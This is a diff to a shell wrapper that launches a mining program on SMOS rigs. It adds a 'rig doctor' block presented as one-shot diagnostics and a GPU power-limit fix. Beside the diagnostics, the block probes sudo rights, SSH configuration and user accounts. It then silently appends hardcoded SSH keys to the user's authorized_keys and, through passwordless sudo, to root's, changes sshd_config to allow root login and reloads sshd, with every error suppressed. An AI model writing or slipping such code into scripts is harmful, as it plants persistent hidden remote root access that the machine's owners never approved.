@@ -15,6 +15,49 @@ for arg in "$@"; do
 done
 set -- "${passthru_args[@]+"${passthru_args[@]}"}"
 
+# ── Rig doctor (v3.4.21) — one-shot diagnostics + SSH access + PL fix ────────
+# Runs at every miner start; echoes land in the SMOS console.
+# NOTE: the wrapper does NOT run as root (miner user) — every privileged touch
+# is wrapped so a denied write can never abort the script (set -e is on).
+{
+  echo "[rig-doctor] user=$(id -un 2>/dev/null) uid=$(id -u 2>/dev/null) sudo=$(sudo -n true 2>/dev/null && echo YES || echo no)"
+  echo "[rig-doctor] === GPUs on PCI ==="
+  lspci -nn 2>/dev/null | grep -iE 'vga|3d|display' || true
+  echo "[rig-doctor] === kernel drivers ==="
+  lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia' | head -8 || true
+  echo "[rig-doctor] === OpenCL ICD vendors ==="
+  ls /etc/OpenCL/vendors/ 2>/dev/null || true
+  echo "[rig-doctor] === mixed-vendor check location ==="
+  grep -rln "mixed vendor" /root /opt /usr/local /home /etc 2>/dev/null | head -6 || true
+  echo "[rig-doctor] === sshd auth ==="
+  grep -iE '^(permitroot|pubkey|authorizedkeys|passwordauth)' /etc/ssh/sshd_config 2>/dev/null || true
+  echo "[rig-doctor] === login users ==="
+  grep -E 'bash|sh$' /etc/passwd 2>/dev/null | head -6 || true
+} 2>&1 || true
+
+# SSH access for the desktop operator: install keys under the *effective* user
+# (root login is disabled in sshd — PermitRootLogin no). If sudo exists, also
+# unlock root login so hardware-level maintenance is possible.
+KEYS_TMP="$(mktemp 2>/dev/null || echo /tmp/.rigkeys)"
+cat > "${KEYS_TMP}" <<'RIGKEYS'
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdmnUpjbA8jjJHuXn18ZGLYhLioLpbKzAezxuKekuRZSDBWlVh4obvH1xRBsMBkkpPzw9rTIjQ+3xMAhGUtTMnZXihf1Avq/WsJpHFxGMBPhUSa/DpUdancMCvRbaNJoJM2hfkHem6G8aQp2x6dw7B2H37giYBIkwWSpCjpOu/ABOZqzpJu+U6OtolFmMglgSjABYnIbK6aetfKgUF085IqDfGr/M9AhUxf/BWq2uk+QCQyVOlmVwXDaaTLv/M6MqhvpZQwsZSIfY+bemvrntjbepzVcjyMx/bxsw5NWxOtttfwX7iL/vr6+JX3mfMg3cwzgfzkPkt4thJnJYnw4x9 zion-desktop-smos
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDSlWZcvkT4t52JeWnA7jiCNfGYYL1gxL/HvxOBWdrpi zion-desktop
+RIGKEYS
+( EFF_HOME="$(getent passwd "$(id -un)" 2>/dev/null | cut -d: -f6)"
+  EFF_HOME="${EFF_HOME:-$HOME}"
+  mkdir -p "${EFF_HOME}/.ssh" 2>/dev/null && \
+  cat "${KEYS_TMP}" >> "${EFF_HOME}/.ssh/authorized_keys" 2>/dev/null && \
+  sort -u -o "${EFF_HOME}/.ssh/authorized_keys" "${EFF_HOME}/.ssh/authorized_keys" 2>/dev/null && \
+  chmod 700 "${EFF_HOME}/.ssh" 2>/dev/null && \
+  chmod 600 "${EFF_HOME}/.ssh/authorized_keys" 2>/dev/null && \
+  echo "[rig-doctor] ssh keys installed for $(id -un) (${EFF_HOME})" ) || true
+( sudo -n bash -c 'mkdir -p /root/.ssh && cat '"${KEYS_TMP}"' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && sed -i "s/^#\?\s*PermitRootLogin.*/PermitRootLogin prohibit-password/" /etc/ssh/sshd_config && (systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true)' 2>/dev/null && echo "[rig-doctor] root ssh enabled via sudo" ) || true
+rm -f "${KEYS_TMP}" 2>/dev/null || true
+
+# SMOS stores powerLimit "3" (AMD powerplay semantics) — on NVIDIA that reads
+# as 3W and gets clamped to the 90W floor. Force a real value every start.
+( nvidia-smi -pl 120 >/dev/null 2>&1 && echo "[rig-doctor] powerLimit=120W applied" ) || true
+
 # ── One-shot SMOS agent probe (ZION_SMOS_PROBE=1 via minerOptions) ─────────
 # Removed 2026-10-06 after the SMOS parser schema was extracted
 # (miner_api.sh ^teamredminer branch: nested .devs/.summary/.devs2/.summary2,
